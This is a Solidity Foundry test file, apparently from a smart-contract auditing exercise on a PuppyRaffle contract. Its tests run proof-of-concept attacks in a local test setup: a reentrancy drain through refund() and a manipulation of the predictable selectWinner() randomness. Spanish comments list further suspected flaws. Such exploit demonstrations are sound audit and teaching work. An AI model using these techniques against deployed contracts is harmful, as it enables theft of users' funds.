// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {DeployPR} from "../script/DeployPR.s.sol";

// Attacks contracts
import {RefundHack} from "./hacks/RefundHack.sol";
import {RandomnessAttack} from "./hacks/RandomnessAttack.sol";

contract PRTEst is Test {
    PuppyRaffle puppyRaffle;

    /////////////
    // USERS ////
    /////////////

    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);

    ////////////////////
    //   CONSTANTS   //
    ///////////////////
    uint256 entranceFee = 1e18;
    uint256 duration = 1 days;

    // RefundHack variables
    address attacker = address(90);
    RefundHack refundHack;
    // selectWinner variables
    RandomnessAttack randomnessAttack;
    address attacker2 = address(80);

    //////////////////
    ///  SETUP  /////
    /////////////////

    function setUp() public {
        DeployPR deployPR = new DeployPR();
        puppyRaffle = deployPR.run();

        vm.deal(attacker, entranceFee);
        vm.startPrank(attacker);
        refundHack = new RefundHack(address(puppyRaffle));
        randomnessAttack = new RandomnessAttack(address(puppyRaffle));
        vm.stopPrank();
    }

    ////////////////////
    //   MODIFIERS   //
    ///////////////////

    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    //////////////////////
    //   TESTS - LOGS  //
    ////////////////////

    function testSSLogs() external view {
        console.log("address this:          ", address(this));
        console.log("contract puppyRaffle:  ", address(puppyRaffle));
        console.log("puppyRaffle owner:     ", puppyRaffle.owner());
        console.log("address feeAddress:    ", feeAddress);
        console.log("address playerOne:     ", playerOne);
        console.log("address playerTwo:     ", playerTwo);
        console.log("address playerThree:   ", playerThree);
        console.log("address playerFour:    ", playerFour);
        console.log("address attacker:      ", attacker);
        /*
         * address this:           0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
         * contract puppyRaffle:   0x5b851F32F9aB7FB2c76480C608034a5ed1f16CfC
         * puppyRaffle owner:      0x0000000000000000000000000000000000000063
         * address feeAddress:     0x0000000000000000000000000000000000000063
         * address playerOne:      0x0000000000000000000000000000000000000001
         * address playerTwo:      0x0000000000000000000000000000000000000002
         * address playerThree:    0x0000000000000000000000000000000000000003
         * address playerFour:     0x0000000000000000000000000000000000000004
         * address hacker:         0x000000000000000000000000000000000000005a
         */
    }

    /////////////////////////
    //   TESTS - refund()  //
    ////////////////////////

    function test_refundAttack() external playersEntered {
        // 0.- Starting point
        uint256 raffleBalance = (address(puppyRaffle).balance);
        assertEq(address(attacker).balance, entranceFee);
        assertEq(address(puppyRaffle).balance, raffleBalance);
        vm.startPrank(attacker);
        // 1.- Put the attack contract into the Raffle
        refundHack.enterRaffle{value: entranceFee}();
        // 4.- Stole the funds
        refundHack.attack();
        vm.stopPrank();
        // After the attack, attacker has all the contract balance and contract has 0.
        assertEq(address(attacker).balance, raffleBalance + entranceFee);
        assertEq(address(puppyRaffle).balance, 0);
    }

    ////////////////////////////////
    //   TESTS - selectWinner()  //
    //////////////////////////////

    /*
     * No es onlyOwner ni access control
     * require: el timestamp debe ser el que debe ser.
     * require: tiene que haber al menos 4 jugadores. ¿Y si no los hay?
     * winner: por un numero online
     * múltiples lecturas de players.length
     * posible reentrada ya que no pone a 0 el prizePool y no es onlyOwner
     * Posible DoS attack si el contrato winner no tiene receive()
     */

    function test_selectWinnerNoRandomness() external playerEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 afterIndex = uint256(keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty)));
        uint256 afterIndex4 = afterIndex % 4;
        uint256 afterIndex5 = afterIndex % 5;

        console.log("afterIndex4: ", afterIndex4); // afterIndex4:  1
        console.log("afterIndex5: ", afterIndex5); // afterIndex4:  4 ok!!!

        // The attacker has found that, in a 5 players game, the position to take is 5.
        address[] memory playerAttack = new address[](4);
        playerAttack[0] = playerTwo;
        playerAttack[1] = playerThree;
        playerAttack[2] = playerFour;
        playerAttack[3] = attacker;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(playerAttack);

        uint256 contractBalance = address(puppyRaffle).balance;
        uint256 attackerBalance = address(attacker).balance;

        // The attacker should execute the function himself to use his/her address!
        vm.prank(attacker);
        puppyRaffle.selectWinner();

        assertEq(attacker.balance, attackerBalance + ((contractBalance * 80) / 100));
    }
}
